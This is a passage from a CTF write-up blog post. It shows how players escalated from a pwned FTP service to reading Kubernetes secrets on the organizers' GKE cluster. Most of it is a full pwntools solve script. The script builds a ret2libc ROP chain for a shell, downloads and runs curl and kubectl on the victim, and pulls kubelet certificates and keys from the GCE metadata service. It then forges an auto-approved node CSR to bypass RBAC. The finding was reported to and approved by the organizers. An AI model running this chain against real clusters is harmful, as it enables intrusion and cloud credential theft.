      We nonetheless decided to report our findings to the organizers because both things should be disabled while hosting CTFs as a best practice, organizers first reaction could be summarized as <em>PoC || GTFO</em> which in my opinion was a reasonable take if we wanted to get some extra points.
      While investigating one of the organizers asked me to run <code>curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true&#x26;alt=text" -H "Metadata-Flavor: Google"</code> which should be getting <em>all</em> the available data from the instance metadata service mentioned earlier, initially no big secrets seemed to be contained there, but after looking closer we found a couple things that seemed interesting: <code>KUBELET_CERT</code> and <code>KUBELET_KEY</code>.
    </p>
    <h1 id="creating-fake-kubernetes-nodes-for-fun-and-profit"><a class="anchor" aria-hidden="true" tabindex="-1" href="#creating-fake-kubernetes-nodes-for-fun-and-profit"><span class="octicon octicon-link"></span></a>Creating fake Kubernetes nodes for fun and profit</h1>
    <p>By searching the internet for more informations on there two variables we found an <a href="https://www.4armed.com/blog/hacking-kubelet-on-gke/">interesting blog post by 4ARMED</a> that seemed to suit exactly our needs so we started fiddling around the GKE cluster, specifically:</p>
    <p>Kubelet credentials only allow to send a CSR to the K8s control plane, this makes those credentials even less useful than the service account we initially got it it wasn't for a small detail: the control plane automatically approves CSRs if they respect some attributes.</p>
    <p>We started by dumping all the existing CSRs and using a node CSR as a reference to craft a new CSR for a keypair we generated for purpose, then we sent the CSR to the control plane and hoped for the best.</p>
    <p>
      After a couple seconds our CSR was actually approved so we could in fact pose as a cluster node.
      This level of access was enough to list all running pods and dump pod specifications, so if there were any flags passed as environment variables to containers we would be able to get them easily.
    </p>
    <p>Not so much in case flags were passed as secrets because by default Kubernetes employs RBAC (Role Based Access Control) to prevent nodes accessing secrets not used by any of their pods.</p>
    <h1 id="the-end-maybe-not"><a class="anchor" aria-hidden="true" tabindex="-1" href="#the-end-maybe-not"><span class="octicon octicon-link"></span></a>The end? Maybe not</h1>
    <p>Then we asked ourselves: <em>how does K8s RBAC check which node is trying to access secrets?</em>, the answer was both easier and more obvious than we initially thought: it uses the requesting node certificate's Common Name (CN) attribute.</p>
    <p>...wait...</p>
    <p>
      Didn't we just say that we can craft arbitrary CSRs and get them automatically approved?
      Yeah, we can in fact exploit that to bypass RBAC and get access to any secret we want.
      This finally convinced admins that we deserved those nice extra points so in the end we were able to secure a 1st place without having to solve that pesky OSINT challenge :P
    </p>
    <h1 id="full-solve-script"><a class="anchor" aria-hidden="true" tabindex="-1" href="#full-solve-script"><span class="octicon octicon-link"></span></a>Full solve script</h1>
    <pre class="language-python"><code class="language-python code-highlight"><span class="code-line line-number" line="1"><span class="token comment">#!/usr/bin/env python3</span>
</span><span class="code-line line-number" line="2">
</span><span class="code-line line-number" line="3"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
</span><span class="code-line line-number" line="4">
</span><span class="code-line line-number" line="5"><span class="token keyword">from</span> pathlib <span class="token keyword">import</span> Path
</span><span class="code-line line-number" line="6"><span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64encode
</span><span class="code-line line-number" line="7"><span class="token keyword">import</span> os
</span><span class="code-line line-number" line="8"><span class="token keyword">import</span> time
</span><span class="code-line line-number" line="9"><span class="token keyword">import</span> json
</span><span class="code-line line-number" line="10">
</span><span class="code-line line-number" line="11">exe <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./ftp_server_patched"</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="12">libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so.6"</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="13">
</span><span class="code-line line-number" line="14">context<span class="token punctuation">.</span>binary <span class="token operator">=</span> exe
</span><span class="code-line line-number" line="15">
</span><span class="code-line line-number" line="16">gdbscript <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
</span></span><span class="code-line line-number" line="17"><span class="token triple-quoted-string string">"""</span>
</span><span class="code-line line-number" line="18">
</span><span class="code-line line-number" line="19">
</span><span class="code-line line-number" line="20">certid <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="21">
</span><span class="code-line line-number" line="22"><span class="token keyword">def</span> <span class="token function">conn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="23">    <span class="token keyword">if</span> args<span class="token punctuation">.</span>LOCAL<span class="token punctuation">:</span>
</span><span class="code-line line-number" line="24">        r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span>exe<span class="token punctuation">.</span>path<span class="token punctuation">]</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="25">    <span class="token keyword">elif</span> args<span class="token punctuation">.</span>GDB<span class="token punctuation">:</span>
</span><span class="code-line line-number" line="26">        r <span class="token operator">=</span> gdb<span class="token punctuation">.</span>debug<span class="token punctuation">(</span><span class="token punctuation">[</span>exe<span class="token punctuation">.</span>path<span class="token punctuation">]</span><span class="token punctuation">,</span> gdbscript<span class="token operator">=</span>gdbscript<span class="token punctuation">)</span>
</span><span class="code-line line-number" line="27">    <span class="token keyword">else</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="28">        r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"34.107.71.117"</span><span class="token punctuation">,</span> <span class="token number">31059</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="29">
</span><span class="code-line line-number" line="30">    <span class="token keyword">return</span> r
</span><span class="code-line line-number" line="31">
</span><span class="code-line line-number" line="32">
</span><span class="code-line line-number" line="33"><span class="token keyword">def</span> <span class="token function">upload_data</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> dest<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="34">    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"$ "</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"echo '</span><span class="token interpolation"><span class="token punctuation">{</span>b64encode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">' | base64 -d > </span><span class="token interpolation"><span class="token punctuation">{</span>dest<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="35">
</span><span class="code-line line-number" line="36"><span class="token keyword">def</span> <span class="token function">upload_file</span><span class="token punctuation">(</span>name<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> dest<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token operator">|</span><span class="token boolean">None</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="37">    <span class="token keyword">if</span> <span class="token keyword">not</span> dest<span class="token punctuation">:</span>
</span><span class="code-line line-number" line="38">        dest <span class="token operator">=</span> name
</span><span class="code-line line-number" line="39">    upload_data<span class="token punctuation">(</span>Path<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'./</span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>read_bytes<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> dest<span class="token punctuation">)</span>
</span><span class="code-line line-number" line="40">
</span><span class="code-line line-number" line="41"><span class="token keyword">def</span> <span class="token function">bootstrap_curl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="42">    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">"./curl-amd64"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="43">        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"wget https://github.com/moparisthebest/static-curl/releases/download/v8.7.1/curl-amd64"</span></span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="44">    <span class="token keyword">assert</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">"./curl-amd64"</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="45">    upload_file<span class="token punctuation">(</span><span class="token string">"curl-amd64"</span><span class="token punctuation">,</span> <span class="token string">"curl"</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="46">    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"$ "</span><span class="token punctuation">,</span> <span class="token string">b"chmod +x curl"</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="47">    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"$ "</span><span class="token punctuation">,</span> <span class="token string">b"alias curl=./curl"</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="48">
</span><span class="code-line line-number" line="49"><span class="token keyword">def</span> <span class="token function">download_exe</span><span class="token punctuation">(</span>url<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> name<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="50">    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"$ "</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f'./curl -kLO "</span><span class="token interpolation"><span class="token punctuation">{</span>url<span class="token punctuation">}</span></span><span class="token string">"'</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="51">    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"$ "</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f'chmod +x </span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="52">    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"$ "</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"alias </span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">=./</span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="53">
</span><span class="code-line line-number" line="54">
</span><span class="code-line line-number" line="55"><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="56">    <span class="token keyword">global</span> r
</span><span class="code-line line-number" line="57">    r <span class="token operator">=</span> conn<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="58">
</span><span class="code-line line-number" line="59">    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"A"</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="60">    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Password buffer is located at: "</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="61">    system <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="62">
</span><span class="code-line line-number" line="63">    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"system: </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="64">
</span><span class="code-line line-number" line="65">    libc<span class="token punctuation">.</span>address <span class="token operator">=</span> system <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
</span><span class="code-line line-number" line="66">
</span><span class="code-line line-number" line="67">    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"libc base: </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="68">
</span><span class="code-line line-number" line="69">    rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token punctuation">[</span>exe<span class="token punctuation">,</span> libc<span class="token punctuation">]</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="70">    rop<span class="token punctuation">.</span>call<span class="token punctuation">(</span>system<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b"/bin/sh\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="71">
</span><span class="code-line line-number" line="72">    payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">{</span>
</span><span class="code-line line-number" line="73">        <span class="token number">80</span><span class="token punctuation">:</span> rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="74">    <span class="token punctuation">}</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="75">
</span><span class="code-line line-number" line="76">    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
</span><span class="code-line line-number" line="77">
</span><span class="code-line line-number" line="78">    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"bootstrapping curl"</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="79">    bootstrap_curl<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="80">
</span><span class="code-line line-number" line="81">    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"$ "</span><span class="token punctuation">,</span> <span class="token string">b"curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env' | grep ^KUBELET_CERT | awk '{print $2}' | base64 -d > kubelet.crt"</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="82">    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"$ "</span><span class="token punctuation">,</span> <span class="token string">b"curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env' | grep ^KUBELET_KEY | awk '{print $2}' | base64 -d > kubelet.key"</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="83">    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"$ "</span><span class="token punctuation">,</span> <span class="token string">b"curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env' | grep ^CA_CERT | awk '{print $2}' | base64 -d > apiserver.crt"</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="84">
</span><span class="code-line line-number" line="85">    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"downloading kubectl"</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="86">    download_exe<span class="token punctuation">(</span><span class="token string">"https://dl.k8s.io/release/v1.31.1/bin/linux/amd64/kubectl"</span><span class="token punctuation">,</span> <span class="token string">"kubectl"</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="87">    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"generating arbitrary node csr"</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="88">    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'openssl req -nodes -newkey rsa:2048 -keyout k8shack.key -out k8shack.csr -subj "/O=system:nodes/CN=system:node:arbitraryname"'</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="89">    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"uploading csr"</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="90">    upload_file<span class="token punctuation">(</span><span class="token string">"k8shack.key"</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="91">    upload_file<span class="token punctuation">(</span><span class="token string">"k8shack.csr"</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="92">
</span><span class="code-line line-number" line="93">    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"listing csrs"</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="94">    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"$ "</span><span class="token punctuation">,</span> <span class="token string">b"kubectl --client-certificate kubelet.crt --client-key kubelet.key --certificate-authority apiserver.crt --server https://${KUBERNETES_PORT_443_TCP_ADDR} get certificatesigningrequests -o json"</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="95">    csrs_text<span class="token operator">=</span> r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"$ "</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="96">    csrs <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>csrs_text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"items"</span><span class="token punctuation">]</span>
</span><span class="code-line line-number" line="97">    csrs <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">filter</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">[</span><span class="token string">"metadata"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"node-csr-"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> csrs<span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="98">    <span class="token comment">#print(csrs)</span>
</span><span class="code-line line-number" line="99">    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="100">    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"sending csr"</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="101">    upload_data<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"""
</span></span></span><span class="code-line line-number" line="102"><span class="token string-interpolation"><span class="token string">apiVersion: certificates.k8s.io/v1
</span></span></span><span class="code-line line-number" line="103"><span class="token string-interpolation"><span class="token string">kind: CertificateSigningRequest
</span></span></span><span class="code-line line-number" line="104"><span class="token string-interpolation"><span class="token string">metadata:
</span></span></span><span class="code-line line-number" line="105"><span class="token string-interpolation"><span class="token string">  name: node-csr-</span><span class="token interpolation"><span class="token punctuation">{</span>certid<span class="token punctuation">}</span></span><span class="token string">
</span></span></span><span class="code-line line-number" line="106"><span class="token string-interpolation"><span class="token string">spec:
</span></span></span><span class="code-line line-number" line="107"><span class="token string-interpolation"><span class="token string">  groups:
</span></span></span><span class="code-line line-number" line="108"><span class="token string-interpolation"><span class="token string">  - system:authenticated
</span></span></span><span class="code-line line-number" line="109"><span class="token string-interpolation"><span class="token string">  request: </span><span class="token interpolation"><span class="token punctuation">{</span>b64encode<span class="token punctuation">(</span>Path<span class="token punctuation">(</span><span class="token string">"k8shack.csr"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read_bytes<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">
</span></span></span><span class="code-line line-number" line="110"><span class="token string-interpolation"><span class="token string">  signerName: kubernetes.io/kube-apiserver-client-kubelet
</span></span></span><span class="code-line line-number" line="111"><span class="token string-interpolation"><span class="token string">  usages:
</span></span></span><span class="code-line line-number" line="112"><span class="token string-interpolation"><span class="token string">  - digital signature
</span></span></span><span class="code-line line-number" line="113"><span class="token string-interpolation"><span class="token string">  - client auth
</span></span></span><span class="code-line line-number" line="114"><span class="token string-interpolation"><span class="token string">  username: kubelet
</span></span></span><span class="code-line line-number" line="115"><span class="token string-interpolation"><span class="token string">"""</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"k8shack.yaml"</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="116">    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"$ "</span><span class="token punctuation">,</span> <span class="token string">b"kubectl --client-certificate kubelet.crt --client-key kubelet.key --certificate-authority apiserver.crt --server https://${KUBERNETES_PORT_443_TCP_ADDR} create -f k8shack.yaml"</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="117">    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"$ "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="118">    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"waiting 5 secs"</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="119">    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="120">    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"kubectl --client-certificate kubelet.crt --client-key kubelet.key --certificate-authority apiserver.crt --server https://${KUBERNETES_PORT_443_TCP_ADDR} get csr node-csr-"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>certid<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="121">    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"$ "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="122">    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"kubectl --client-certificate kubelet.crt --client-key kubelet.key --certificate-authority apiserver.crt --server https://${{KUBERNETES_PORT_443_TCP_ADDR}} get csr node-csr-</span><span class="token interpolation"><span class="token punctuation">{</span>certid<span class="token punctuation">}</span></span><span class="token string"> -o jsonpath='{{.status.certificate}}' | base64 -d > node2.crt"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="123">
</span><span class="code-line line-number" line="124">    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"$ "</span><span class="token punctuation">,</span> <span class="token string">b"kubectl --client-certificate node2.crt --client-key k8shack.key --certificate-authority apiserver.crt --server https://${KUBERNETES_PORT_443_TCP_ADDR} get pods -o wide"</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="125">    r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="126">
</span><span class="code-line line-number" line="127">
</span><span class="code-line line-number" line="128"><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="129">    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span></code><div onclick="copied(this)" data-code="#!/usr/bin/env python3

from pwn import *

from pathlib import Path
from base64 import b64encode
import os
import time
import json

exe = ELF(&#x22;./ftp_server_patched&#x22;)
libc = ELF(&#x22;./libc.so.6&#x22;)

context.binary = exe

gdbscript = &#x22;&#x22;&#x22;
&#x22;&#x22;&#x22;


certid = int(time.time())

def conn():
    if args.LOCAL:
        r = process([exe.path])
    elif args.GDB:
        r = gdb.debug([exe.path], gdbscript=gdbscript)
    else:
        r = remote(&#x22;34.107.71.117&#x22;, 31059)

    return r


def upload_data(data: bytes, dest: str):
    r.sendlineafter(b&#x22;$ &#x22;, f&#x22;echo &#x27;{b64encode(data).decode()}&#x27; | base64 -d > {dest}&#x22;.encode())

def upload_file(name: str, dest: str|None = None):
    if not dest:
        dest = name
    upload_data(Path(f&#x27;./{name}&#x27;).read_bytes(), dest)

def bootstrap_curl():
    if not os.path.exists(&#x22;./curl-amd64&#x22;):
        os.system(f&#x22;wget https://github.com/moparisthebest/static-curl/releases/download/v8.7.1/curl-amd64&#x22;)
    assert os.path.exists(&#x22;./curl-amd64&#x22;)
    upload_file(&#x22;curl-amd64&#x22;, &#x22;curl&#x22;)
    r.sendlineafter(b&#x22;$ &#x22;, b&#x22;chmod +x curl&#x22;)
    r.sendlineafter(b&#x22;$ &#x22;, b&#x22;alias curl=./curl&#x22;)

def download_exe(url: str, name: str):
    r.sendlineafter(b&#x22;$ &#x22;, f&#x27;./curl -kLO &#x22;{url}&#x22;&#x27;.encode())
    r.sendlineafter(b&#x22;$ &#x22;, f&#x27;chmod +x {name}&#x27;.encode())
    r.sendlineafter(b&#x22;$ &#x22;, f&#x22;alias {name}=./{name}&#x22;.encode())


def main():
    global r
    r = conn()

    r.sendline(b&#x22;A&#x22;)
    r.recvuntil(b&#x22;Password buffer is located at: &#x22;)
    system = int(r.recvline().strip(), 16)

    log.info(f&#x22;system: {hex(system)}&#x22;)

    libc.address = system - libc.sym[&#x27;system&#x27;]

    log.success(f&#x22;libc base: {hex(libc.address)}&#x22;)

    rop = ROP([exe, libc])
    rop.call(system, [next(libc.search(b&#x22;/bin/sh\x00&#x22;))])

    payload = flat({
        80: rop.chain()
    })

    r.sendline(payload)

    log.info(&#x22;bootstrapping curl&#x22;)
    bootstrap_curl()

    r.sendlineafter(b&#x22;$ &#x22;, b&#x22;curl -s -H &#x27;Metadata-Flavor: Google&#x27; &#x27;http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env&#x27; | grep ^KUBELET_CERT | awk &#x27;{print $2}&#x27; | base64 -d > kubelet.crt&#x22;)
    r.sendlineafter(b&#x22;$ &#x22;, b&#x22;curl -s -H &#x27;Metadata-Flavor: Google&#x27; &#x27;http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env&#x27; | grep ^KUBELET_KEY | awk &#x27;{print $2}&#x27; | base64 -d > kubelet.key&#x22;)
    r.sendlineafter(b&#x22;$ &#x22;, b&#x22;curl -s -H &#x27;Metadata-Flavor: Google&#x27; &#x27;http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env&#x27; | grep ^CA_CERT | awk &#x27;{print $2}&#x27; | base64 -d > apiserver.crt&#x22;)

    log.info(&#x22;downloading kubectl&#x22;)
    download_exe(&#x22;https://dl.k8s.io/release/v1.31.1/bin/linux/amd64/kubectl&#x22;, &#x22;kubectl&#x22;)
    log.info(&#x22;generating arbitrary node csr&#x22;)
    os.system(&#x27;openssl req -nodes -newkey rsa:2048 -keyout k8shack.key -out k8shack.csr -subj &#x22;/O=system:nodes/CN=system:node:arbitraryname&#x22;&#x27;)
    log.info(&#x22;uploading csr&#x22;)
    upload_file(&#x22;k8shack.key&#x22;)
    upload_file(&#x22;k8shack.csr&#x22;)

    log.info(&#x22;listing csrs&#x22;)
    r.sendlineafter(b&#x22;$ &#x22;, b&#x22;kubectl --client-certificate kubelet.crt --client-key kubelet.key --certificate-authority apiserver.crt --server https://${KUBERNETES_PORT_443_TCP_ADDR} get certificatesigningrequests -o json&#x22;)
    csrs_text= r.recvuntil(b&#x22;$ &#x22;, drop=True)
    csrs = json.loads(csrs_text)[&#x22;items&#x22;]
    csrs = list(filter(lambda x: x[&#x22;metadata&#x22;][&#x22;name&#x22;].startswith(&#x22;node-csr-&#x22;), csrs))
    #print(csrs)
    r.sendline()
    log.info(&#x22;sending csr&#x22;)
    upload_data(f&#x22;&#x22;&#x22;
apiVersion: certificates.k8s.io/v1
kind: CertificateSigningRequest
metadata:
  name: node-csr-{certid}
spec:
  groups:
  - system:authenticated
  request: {b64encode(Path(&#x22;k8shack.csr&#x22;).read_bytes()).decode()}
  signerName: kubernetes.io/kube-apiserver-client-kubelet
  usages:
  - digital signature
  - client auth
  username: kubelet
&#x22;&#x22;&#x22;.encode(), &#x22;k8shack.yaml&#x22;)
